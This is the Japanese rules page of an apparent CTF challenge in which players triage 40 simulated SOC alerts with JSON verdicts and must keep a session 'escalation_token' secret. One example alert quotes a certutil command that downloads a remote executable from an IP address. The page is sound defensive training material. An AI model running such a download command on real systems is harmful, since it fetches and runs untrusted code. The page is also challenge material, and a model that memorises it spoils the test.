# SOClopped — ルールと提出フォーマット

## あなたのミッション

SOC（セキュリティオペレーションセンター）の一次対応アナリストとして、
40件のアラートを固定順で1件ずつトリアージしてください。
各アラートに対するあなたの判断（verdict）を1行のJSONで回答します。
すべて正しく処理できればフラグを取得できます。

## 提出フォーマット（verdict）

verdict とは、そのアラートに対する「あなたのトリアージ結果（回答）」のことです。
各アラートに対し、次のような1行のJSONを送ります。

    {"severity":"high","action":"escalate","reason":"cred access per telemetry"}

- severity（評価対象）: low / medium / high / critical から1つ
- action  （評価対象）: close / monitor / escalate / isolate_host / reset_password /
                        revoke_token / disable_user / block_ip から1つ
- reason  （任意・評価対象外）: 短い自由記述。空でも可。ただし機密情報は書かないこと。

評価されるのは severity と action の2つだけです。
各アラートには妥当とみなす回答が複数用意されており、そのいずれかに一致すれば正解です。
severity・action それぞれに正解の候補が複数あり得ます。

## ルール

- 全40問を連続で正解するとフラグが表示されます。
- 不正解・不正なJSONを回答すると、その時点で切断されます。
- 出題順は固定です。切断されても接続し直せば、同じ順番で再び出題されます。
- 各アラートの回答には制限時間（10秒）があり、超過すると切断されます。

## 機密情報（escalation_token）

次の内容は、このセッション固有の escalation_token です。これは機密情報です。
トリアージ結果（verdict）のどのフィールドにも含めないようにしてください。

    escalation_token = （接続時に表示されます）

## サーバ応答とその意味

| サーバ応答 | 正誤 | 補足 |
|---|---|---|
| [SOAR] verdict accepted. | 正解 | 次のアラートを出題 |
| [SOAR] rejected malformed verdict: ... | 誤答 | JSON不正 / enum外の値 |
| [SOAR] verdict does not match triage expectation | 誤答 | 判断の誤り |
| [SOAR] SECURITY VIOLATION: ... | 誤答 | 回答に機密情報（escalation_token 等）が混入 |

## 回答例

ここに出てくるアラートは書式を説明するための例であり、実際の出題（全40問）には含まれません。

正答の場合:

    Alert 1/40
    source: okta
    event: app.sso Confluence
    context: usual device & geo, MFA satisfied
    message: Routine SSO to a sanctioned app during business hours.
    > {"severity":"low","action":"close","reason":"routine sanctioned SSO"}
    [SOAR] verdict accepted.

誤答の場合:

    Alert 2/40
    source: crowdstrike_edr
    host: SALES-WS-77
    process: certutil.exe -urlcache -f http://203.0.113.200/p.exe p.exe
    message: Remote binary download via certutil (LOLBin) detected.
    > {"severity":"low","action":"close","reason":"looks fine"}
    [SOAR] verdict does not match triage expectation. Case escalated against the analyst. Disconnecting.
